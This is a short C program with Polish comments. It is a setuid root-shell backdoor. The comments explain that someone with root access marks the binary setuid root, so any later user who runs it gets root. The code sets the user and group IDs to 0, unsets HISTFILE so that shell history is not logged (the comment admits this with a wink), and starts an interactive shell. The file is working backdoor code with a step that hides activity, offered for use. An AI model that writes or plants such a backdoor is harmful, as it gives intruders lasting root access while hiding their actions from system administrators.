#include<unistd.h>
#include<sys/types.h>
#include<stdlib.h>

/*
 * Jako root wpisuję polecenia na binarnej wersji programu (skompilowanej):
 * chown root.root NAZWA_PLIKU_DAJACEGO_PRAWA_ROOTA
 * chmod +s NAZWA_PLIKU_DAJACEGO_PRAWA_ROOTA
 */
int main(){
	setuid(0);	//identyfikator root
	setgid(0);	//identyfikator grupy root
	unsetenv("HISTFILE");	//usuwanie zmiennej środowiskowej HISTFILE
				//zawierającą nazwę pliku historii poleceń ;)
	execl("/bin/sh","sh","-i",NULL);	//uruchomienie powłoki
	return 0;
}

